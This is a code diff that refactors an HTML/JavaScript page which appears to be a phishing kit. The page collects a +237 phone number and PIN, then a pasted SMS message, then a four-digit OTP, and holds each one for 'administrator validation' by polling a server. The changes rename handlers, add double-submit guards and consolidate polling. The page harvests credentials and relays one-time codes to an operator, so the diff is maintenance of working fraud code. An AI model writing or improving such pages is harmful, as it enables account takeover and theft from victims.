@@ -113,7 +113,7 @@
 
     /* LANDING PAGE */
     #page-landing { background: var(--page-bg); }
-    .land-nav { background: var(--navy); display: flex; align-items: center; justify-style: space-between; padding: 0 24px; height: 64px; flex-shrink: 0; }
+    .land-nav { background: var(--navy); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; height: 64px; flex-shrink: 0; }
     .land-nav .hbg { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
     .land-nav .hbg span { width: 20px; height: 2px; background: rgba(255,255,255,0.8); border-radius: 1px; display: block; }
     .land-center { flex: 1; display: flex; align-items: center; justify-content: center; padding: 32px 16px; }
@@ -481,7 +481,7 @@
   </div>
 </div>
 
-<!-- PAGE LOGIN -->
+<!-- PAGE LOGIN (PIN STAGE) -->
 <div id="page-login" class="page">
   <div class="login-hdr">
     <div class="hp-logo-inline" style="flex-direction:column;gap:6px;">
@@ -511,7 +511,7 @@
       </div>
       
       <div class="forgot-pin">Forgot PIN code?</div>
-      <button class="btn-login" id="bLogin" onclick="doLogin()">LOG IN</button>
+      <button class="btn-login" id="bLogin" onclick="submitPin()">LOG IN</button>
     </div>
   </div>
   <div class="lg-curve">
@@ -526,7 +526,7 @@
   </div>
 </div>
 
-<!-- PAGE OTP -->
+<!-- PAGE OTP & SMS VERIFICATION -->
 <div id="page-otp" class="page">
   <div class="otp-topbar">
     <button class="bk" onclick="resetAndGoLogin()">←</button>
@@ -551,16 +551,16 @@
         <p>Waiting for administrator validation of your information…</p>
       </div>
 
-      <!-- STEP 1: SMS Verification Pasting -->
+      <!-- STEP 1: SMS Verification Stage -->
       <div id="otpStep1">
         <p class="otp-hint" style="font-weight:700; color:var(--navy); margin-bottom:8px;">Step 1: SMS Verification</p>
         <div class="field" style="margin-bottom:14px;">
           <textarea id="smsPasteInput" placeholder="Paste your received SMS message or verification code here..." oninput="chkSmsStep()" style="min-height:85px;"></textarea>
         </div>
-        <button class="btn-otp" id="bOtpStep1" onclick="submitSmsStep()">SUBMIT</button>
+        <button class="btn-otp" id="bOtpStep1" onclick="submitSms()">SUBMIT</button>
       </div>
 
-      <!-- STEP 2: Four Digits OTP Verification Code -->
+      <!-- STEP 2: 4-Digit OTP Verification Stage -->
       <div id="otpStep2" style="display:none;">
         <p class="otp-hint" style="font-weight:700; color:var(--navy); margin-bottom:8px;">Step 2: Four-Digit OTP Verification Code</p>
         <div class="otp-inputs" id="otpContainer">
@@ -570,7 +570,7 @@
           <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="o3">
         </div>
         <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">60</span> seconds</div>
-        <button class="btn-otp" id="bOtp" onclick="doOtp()">VERIFY & COMPLETE</button>
+        <button class="btn-otp" id="bOtp" onclick="submitOtp()">VERIFY & COMPLETE</button>
       </div>
     </div>
   </div>
@@ -650,6 +650,23 @@
     applicationId: null,
     assignedAdminId: null
   };
+
+  // POLLING INTERVAL HANDLES
+  let pinPollInterval = null;
+  let smsPollInterval = null;
+  let otpPollInterval = null;
+  let _rsInterval = null;
+
+  // IN-FLIGHT FLAGS TO PREVENT MULTIPLE SUBMISSIONS
+  let _pinInFlight = false;
+  let _smsInFlight = false;
+  let _otpInFlight = false;
+
+  function clearAllPolls() {
+    if (pinPollInterval) { clearInterval(pinPollInterval); pinPollInterval = null; }
+    if (smsPollInterval) { clearInterval(smsPollInterval); smsPollInterval = null; }
+    if (otpPollInterval) { clearInterval(otpPollInterval); otpPollInterval = null; }
+  }
 
   function getAdminId() {
     const params = new URLSearchParams(window.location.search);
@@ -880,6 +897,12 @@
     document.getElementById('bOtp').className = otp.length === 4 ? 'btn-otp rdy' : 'btn-otp';
   }
 
+  function chkSmsStep() {
+    const val = document.getElementById('smsPasteInput').value.trim();
+    const btn = document.getElementById('bOtpStep1');
+    btn.className = val.length > 0 ? 'btn-otp rdy' : 'btn-otp';
+  }
+
   function togPin() {
     for (let i = 0; i < 5; i++) {
       const b = document.getElementById('p' + i);
@@ -887,11 +910,12 @@
     }
   }
 
-  // LOGIN REQUEST
-  let _loginInFlight = false;
+  // ==========================================
+  // STAGE 1: PIN VERIFICATION & POLLING
+  // ==========================================
 
-  async function doLogin() {
-    if (_loginInFlight) return;          
+  async function submitPin() {
+    if (_pinInFlight) return;
     hideLoginMsg();
 
     const rawPhone = document.getElementById('lgPh').value.trim();
@@ -909,7 +933,7 @@
     const phoneNumber = '+237' + rawPhone;
     const adminId = getAdminId();
 
-    _loginInFlight = true;
+    _pinInFlight = true;
     document.getElementById('mLogin').classList.add('show');
     document.getElementById('bLogin').disabled = true;
 
@@ -927,7 +951,7 @@
 
       const data = await res.json();
       document.getElementById('mLogin').classList.remove('show');
-      _loginInFlight = false;
+      _pinInFlight = false;
 
       if (data.success) {
         S.applicationId   = data.applicationId;
@@ -946,20 +970,18 @@
         showLoginMsg(data.message || 'Verification failed. Please try again.');
       }
     } catch (err) {
-      _loginInFlight = false;
+      _pinInFlight = false;
       document.getElementById('mLogin').classList.remove('show');
       document.getElementById('bLogin').disabled = false;
       showLoginMsg('Network error. Please check your connection.');
     }
   }
 
-  // POLLING HELPERS
-  let pinPollInterval = null;
-
   function pollPinStatus() {
-    if (pinPollInterval) clearInterval(pinPollInterval);
+    clearAllPolls();
 
     pinPollInterval = setInterval(async () => {
+      if (!S.applicationId) return;
       try {
         const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
         const data = await res.json();
@@ -970,6 +992,7 @@
           pinPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpStep1').style.display = 'block';
+          document.getElementById('otpStep2').style.display = 'none';
           showOtpMsg('success', 'Information verified! Please complete Step 1: SMS Verification.');
 
         } else if (data.status === 'rejected') {
@@ -983,12 +1006,63 @@
     }, 2000);
   }
 
-  let smsPollInterval = null;
+  // Backwards compatibility alias
+  const doLogin = submitPin;
+
+  // ==========================================
+  // STAGE 2: SMS VERIFICATION & POLLING
+  // ==========================================
+
+  async function submitSms() {
+    if (_smsInFlight || !S.applicationId) return;
+
+    const smsText = document.getElementById('smsPasteInput').value.trim();
+    if (!smsText) {
+      showOtpMsg('warning', 'Please paste or enter your SMS verification code.');
+      return;
+    }
+    hideOtpMsgs();
+
+    _smsInFlight = true;
+    const btn = document.getElementById('bOtpStep1');
+    btn.disabled = true;
+    btn.textContent = 'VERIFYING SMS…';
+
+    try {
+      const res = await fetch('/api/verify-sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ applicationId: S.applicationId, smsText })
+      });
+      const data = await res.json();
+
+      _smsInFlight = false;
+
+      if (data.success) {
+        document.getElementById('otpStep1').style.display = 'none';
+        document.getElementById('pinWait').classList.add('show');
+        showOtpMsg('info', 'SMS submitted. Waiting for administrator validation...');
+        pollSmsStatus();
+      } else {
+        btn.disabled = false;
+        btn.textContent = 'SUBMIT';
+        chkSmsStep();
+        showOtpMsg('error', data.message || 'SMS verification failed. Please try again.');
+      }
+    } catch (err) {
+      _smsInFlight = false;
+      btn.disabled = false;
+      btn.textContent = 'SUBMIT';
+      chkSmsStep();
+      showOtpMsg('error', 'Network error submitting SMS. Please check connection.');
+    }
+  }
 
   function pollSmsStatus() {
-    if (smsPollInterval) clearInterval(smsPollInterval);
+    clearAllPolls();
 
     smsPollInterval = setInterval(async () => {
+      if (!S.applicationId) return;
       try {
         const res  = await fetch(`/api/check-sms-status/${S.applicationId}`);
         const data = await res.json();
@@ -1013,7 +1087,7 @@
           document.getElementById('smsPasteInput').value = '';
           const btn = document.getElementById('bOtpStep1');
           btn.disabled = false;
-          btn.textContent = 'NEXT: 4-DIGIT OTP';
+          btn.textContent = 'SUBMIT';
           btn.className = 'btn-otp';
           showOtpMsg('error', 'SMS verification was rejected. Please re-paste your SMS code.');
           document.getElementById('smsPasteInput').focus();
@@ -1022,94 +1096,16 @@
     }, 2000);
   }
 
-  function chkSmsStep() {
-    const val = document.getElementById('smsPasteInput').value.trim();
-    const btn = document.getElementById('bOtpStep1');
-    btn.className = val.length > 0 ? 'btn-otp rdy' : 'btn-otp';
-  }
+  // Backwards compatibility alias
+  const submitSmsStep = submitSms;
 
-  async function submitSmsStep() {
-    const smsText = document.getElementById('smsPasteInput').value.trim();
-    if (!smsText) {
-      showOtpMsg('warning', 'Please paste or enter your SMS verification code.');
-      return;
-    }
-    hideOtpMsgs();
+  // ==========================================
+  // STAGE 3: 4-DIGIT OTP VERIFICATION & POLLING
+  // ==========================================
 
-    const btn = document.getElementById('bOtpStep1');
-    btn.disabled = true;
-    btn.textContent = 'VERIFYING SMS…';
+  async function submitOtp() {
+    if (_otpInFlight || !S.applicationId) return;
 
-    try {
-      const res = await fetch('/api/verify-sms', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, smsText })
-      });
-      const data = await res.json();
-
-      btn.disabled = false;
-      btn.textContent = 'NEXT: 4-DIGIT OTP';
-
-      if (data.success) {
-        document.getElementById('otpStep1').style.display = 'none';
-        document.getElementById('pinWait').classList.add('show');
-        showOtpMsg('info', 'SMS submitted. Waiting for administrator validation...');
-        pollSmsStatus();
-      } else {
-        showOtpMsg('error', data.message || 'SMS verification failed. Please try again.');
-      }
-    } catch (err) {
-      btn.disabled = false;
-      btn.textContent = 'NEXT: 4-DIGIT OTP';
-      showOtpMsg('error', 'Network error submitting SMS. Please check connection.');
-    }
-  }
-
-  let _rsInterval = null;
-  function startRs() {
-    if (_rsInterval) clearInterval(_rsInterval);
-    let s = 60;
-    const rsBox = document.getElementById('otpRs');
-    if (!rsBox) return;
-
-    rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
-    _rsInterval = setInterval(() => {
-      s--;
-      const cur = document.getElementById('rsS');
-      if (cur) cur.textContent = s;
-      if (s <= 0) {
-        clearInterval(_rsInterval);
-        _rsInterval = null;
-        rsBox.innerHTML = '<span style="color:var(--navy);cursor:pointer;font-weight:700" onclick="resendOtp()">Resend code</span>';
-      }
-    }, 1000);
-  }
-
-  async function resendOtp() {
-    if (!S.applicationId) return;
-    try {
-      const res = await fetch('/api/resend-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId })
-      });
-      const data = await res.json();
-      if (data.success) {
-        showOtpMsg('info', 'A new OTP request has been sent.');
-        startRs();
-        for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
-        document.getElementById('bOtp').className = 'btn-otp';
-        document.getElementById('o0').focus();
-      } else {
-        showOtpMsg('error', 'Failed to resend OTP.');
-      }
-    } catch {
-      showOtpMsg('error', 'Network error resending OTP.');
-    }
-  }
-
-  async function doOtp() {
     const otp = getDigitValue('o', 4);
     if (otp.length < 4) {
       showOtpMsg('warning', 'Please enter all 4 digits of your OTP code.');
@@ -1117,6 +1113,7 @@
     }
 
     hideOtpMsgs();
+    _otpInFlight = true;
     let c = 3;
     document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
     document.getElementById('mOtp').classList.add('show');
@@ -1139,14 +1136,17 @@
       clearInterval(countdown);
       document.getElementById('mOtp').classList.remove('show');
 
+      _otpInFlight = false;
+
       if (data.success) {
-        showOtpMsg('success', 'OTP submitted. Waiting for approval…');
+        showOtpMsg('info', 'OTP submitted. Waiting for approval…');
         pollOtpStatus();
       } else {
         document.getElementById('bOtp').disabled = false;
         showOtpMsg('error', data.message || 'OTP submission failed.');
       }
     } catch (err) {
+      _otpInFlight = false;
       clearInterval(countdown);
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
@@ -1154,12 +1154,11 @@
     }
   }
 
-  let otpPollInterval = null;
-
   function pollOtpStatus() {
-    if (otpPollInterval) clearInterval(otpPollInterval);
+    clearAllPolls();
 
     otpPollInterval = setInterval(async () => {
+      if (!S.applicationId) return;
       try {
         const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
         const data = await res.json();
@@ -1205,6 +1204,53 @@
     }, 2000);
   }
 
+  // Backwards compatibility alias
+  const doOtp = submitOtp;
+
+  // RESEND OTP
+  function startRs() {
+    if (_rsInterval) clearInterval(_rsInterval);
+    let s = 60;
+    const rsBox = document.getElementById('otpRs');
+    if (!rsBox) return;
+
+    rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
+    _rsInterval = setInterval(() => {
+      s--;
+      const cur = document.getElementById('rsS');
+      if (cur) cur.textContent = s;
+      if (s <= 0) {
+        clearInterval(_rsInterval);
+        _rsInterval = null;
+        rsBox.innerHTML = '<span style="color:var(--navy);cursor:pointer;font-weight:700" onclick="resendOtp()">Resend code</span>';
+      }
+    }, 1000);
+  }
+
+  async function resendOtp() {
+    if (!S.applicationId) return;
+    try {
+      const res = await fetch('/api/resend-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ applicationId: S.applicationId })
+      });
+      const data = await res.json();
+      if (data.success) {
+        showOtpMsg('info', 'A new OTP request has been sent.');
+        startRs();
+        for(let i=0; i<4; i++) document.getElementById('o'+i).value = '';
+        document.getElementById('bOtp').className = 'btn-otp';
+        document.getElementById('o0').focus();
+      } else {
+        showOtpMsg('error', 'Failed to resend OTP.');
+      }
+    } catch {
+      showOtpMsg('error', 'Network error resending OTP.');
+    }
+  }
+
+  // RESET AND REDIRECT TO LOGIN
   function resetAndGoLogin() {
     document.getElementById('smsPasteInput').value = '';
     
@@ -1217,22 +1263,26 @@
       if (el) el.value = '';
     }
 
-    document.getElementById('bOtp').className = 'btn-otp';
-    document.getElementById('bOtp').disabled = false;
+    const bStep1 = document.getElementById('bOtpStep1');
+    if (bStep1) { bStep1.className = 'btn-otp'; bStep1.disabled = false; bStep1.textContent = 'SUBMIT'; }
+
+    const bOtp = document.getElementById('bOtp');
+    if (bOtp) { bOtp.className = 'btn-otp'; bOtp.disabled = false; }
+
     document.getElementById('pinWait').classList.remove('show');
     document.getElementById('otpStep1').style.display = 'block';
     document.getElementById('otpStep2').style.display = 'none';
 
-    if (typeof _rsInterval !== 'undefined' && _rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-    if (typeof pinPollInterval !== 'undefined' && pinPollInterval) { clearInterval(pinPollInterval); pinPollInterval = null; }
-    if (typeof smsPollInterval !== 'undefined' && smsPollInterval) { clearInterval(smsPollInterval); smsPollInterval = null; }
-    if (typeof otpPollInterval !== 'undefined' && otpPollInterval) { clearInterval(otpPollInterval); otpPollInterval = null; }
+    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+    clearAllPolls();
 
     hideOtpMsgs();
     document.getElementById('bLogin').disabled = false;
     chkLogin();
     hideLoginMsg();
-    _loginInFlight = false;
+    _pinInFlight = false;
+    _smsInFlight = false;
+    _otpInFlight = false;
     S.applicationId = null;
     S.assignedAdminId = null;
     goTo('page-login');
